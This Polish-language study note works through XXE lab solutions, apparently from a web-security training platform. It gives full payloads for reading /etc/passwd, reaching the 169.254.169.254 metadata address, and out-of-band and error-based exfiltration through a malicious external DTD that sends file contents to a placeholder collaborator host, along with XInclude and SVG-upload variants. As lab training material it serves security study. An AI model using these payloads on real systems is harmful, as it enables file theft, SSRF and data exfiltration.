XML to prosty format tekstowy służący do przechowywania i wymiany danych w uporządkowanej (tagowanej) formie.

XXE (XML External Entity) to podatność bezpieczeństwa, w której parser XML pozwala na wczytanie zewnętrznych danych (np. plików z systemu), co atakujący może wykorzystać do kradzieży informacji lub ataku.

📦 Przykład:

```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```
XML mówi: „hej parserze, weź dane z innego miejsca”
to „inne miejsce” to właśnie external entity

🧠 Czyli:
dla OS: /etc/passwd → wewnętrzny plik
dla XML parsera: /etc/passwd → zewnętrzne źródło danych

🔥 Najprostsza definicja (pentesterska):
External = poza XML-em, nie poza systemem

Dlatego:
file:///etc/passwd → external entity (lokalny plik)
http://127.0.0.1 → external entity (sieć)
ftp://... → też external

<br><br>
<hr>
<br><br>
<h2>Lab: Exploiting XXE using external entities to retrieve files</h2>

 This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response. 

 original:

 ```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>3</storeId></stockCheck>
```

payload:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>3</storeId></stockCheck>
```



 <img width="1200" height="602" alt="image" src="https://github.com/user-attachments/assets/1c37d999-3ef4-43ae-a413-8b89dd6524a8" />


<img width="1199" height="646" alt="image" src="https://github.com/user-attachments/assets/aa660ba5-5031-4729-8ee2-3e63c18d1d94" />




<br><br>
<hr>
<br><br>
<h2>Lab: Exploiting XXE to perform SSRF attacks</h2>

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response. 


original:

```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
  <productId>
    &xxe;
  </productId>
  <storeId>
  </storeId>
</stockCheck>

```

<img width="1198" height="608" alt="image" src="https://github.com/user-attachments/assets/e3dec4a8-0e91-44fb-a2ba-90494df6f845" />


<img width="1223" height="687" alt="image" src="https://github.com/user-attachments/assets/dec80acb-67a4-467e-8457-67a1ddb34834" />
<img width="1204" height="603" alt="image" src="https://github.com/user-attachments/assets/0d452c77-0ad6-4f12-adb7-f7f73b9a36cb" />



<br><br>
<hr>
<br><br>
<h2>Lab: Blind XXE with out-of-band interaction</h2>

payload:
(ppm>insert collab)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLAEDRATOR-SUBDOMAIN"> ]>
<stockCheck>
  <productId>
    &xxe;
  </productId>
  <storeId>
  </storeId>
</stockCheck>
```

<img width="1196" height="588" alt="image" src="https://github.com/user-attachments/assets/a4b421a1-b58a-4b5f-a40a-67276736ee93" />

<img width="1195" height="603" alt="image" src="https://github.com/user-attachments/assets/48cf2a12-8ce6-4b3d-83c1-a54ff4d4ed51" />

<img width="1191" height="612" alt="image" src="https://github.com/user-attachments/assets/f6196373-80b9-48ea-af02-580116aeeb11" />


<br><br>
<hr>
<br><br>
<h2>Lab: Blind XXE with out-of-band interaction via XML parameter entities</h2>

payload:
(ppm>insert collab)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN">%xxe; ]>
<stockCheck>
  <productId>
6
  </productId>
  <storeId>
2
  </storeId>
</stockCheck>
```


<img width="1205" height="636" alt="image" src="https://github.com/user-attachments/assets/afb8f9d5-433e-4cd1-8b61-51be84056d86" />

<img width="1202" height="658" alt="image" src="https://github.com/user-attachments/assets/75506037-121c-460e-8965-71327110cfb5" />



<br><br>
<hr>
<br><br>
<h2>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</h2>

Atak polega na zmuszeniu serwera do pobrania złośliwego DTD, który odczytuje lokalne dane i wysyła je na serwer atakującego (Collaborator).

1. wysyłasz XML, który każe serwerowi pobrać zewnętrzny DTD (z exploit servera)
2. ten DTD zawiera złośliwe encje, które:
3. czytają lokalny plik (np. /etc/passwd) i wysyłają jego zawartość na Collaboratora
4. serwer parsuje XML + DTD i sam wykonuje exfiltrację danych

payload repeater:
(ppm>insert collab)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "https://expolit-server.net/exploit">%xxe; ]>
<stockCheck>
  <productId>
6
  </productId>
  <storeId>
2
  </storeId>
</stockCheck>
```


exploit server body:

```
<! ENTITY % file SYSTEM "file:///etc/hostname">
<! ENTITY % eval " <! ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file; '>">
%eval;
%exfil;
```


<img width="1195" height="608" alt="image" src="https://github.com/user-attachments/assets/f4446ade-0192-4496-b6a4-636c7ffc784c" />

<img width="1389" height="683" alt="image" src="https://github.com/user-attachments/assets/3c45dd23-3d66-4e02-bc8b-d355c4115473" />
<img width="1344" height="724" alt="image" src="https://github.com/user-attachments/assets/35706f62-5a87-44de-bccb-39b4a4a19dff" />


<br><br>
<hr>
<br><br>
<h2>Lab: Exploiting blind XXE to retrieve data via error messages</h2>

malicious DTD in exlpoit server body:
payload:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

request payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
<stockCheck>
  <productId>
6
  </productId>
  <storeId>
2
  </storeId>
</stockCheck>
```

Po zaimportowaniu ta strona odczyta zawartość pliku /etc/passwd do encji pliku, a następnie spróbuje użyć tej encji jako ścieżki do pliku. 
<img width="792" height="528" alt="image" src="https://github.com/user-attachments/assets/7f179c9d-a35a-4b4d-85ae-6ba254afbe0c" />

<img width="1076" height="228" alt="image" src="https://github.com/user-attachments/assets/6268d811-9b9d-4f7f-9480-012aa809bee6" />

<img width="881" height="363" alt="image" src="https://github.com/user-attachments/assets/8fa4113c-4076-4075-9f6a-9e9f9f0461c7" />


<br><br>
<hr>
<br><br>
<h2>Lab: Exploiting XInclude to retrieve files</h2>

 This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.
Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file. 

hint:
By default, XInclude will try to parse the included document as XML. Since /etc/passwd isn't valid XML, you will need to add an extra attribute to the XInclude directive to change this behavior. 

payload in product Id:
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>


<img width="875" height="442" alt="image" src="https://github.com/user-attachments/assets/ea71fb11-efed-45e4-9584-0aa5f0c410da" />

<img width="1190" height="554" alt="image" src="https://github.com/user-attachments/assets/0b31161b-79b3-46ce-a465-48cd58927fcd" />


<br><br>
<hr>
<br><br>
<h2>Lab: Exploiting XXE via image file upload</h2>

 This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname. 

HINT:
The SVG image format uses XML. 

Payload:
Create a local SVG image with the following content: 

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

<img width="745" height="252" alt="image" src="https://github.com/user-attachments/assets/928a0ed6-c3d5-4a4d-b87e-d5792f8e5e77" />

<img width="668" height="457" alt="image" src="https://github.com/user-attachments/assets/528332e9-dcd9-4d7f-b0dd-6bf6936de75f" />



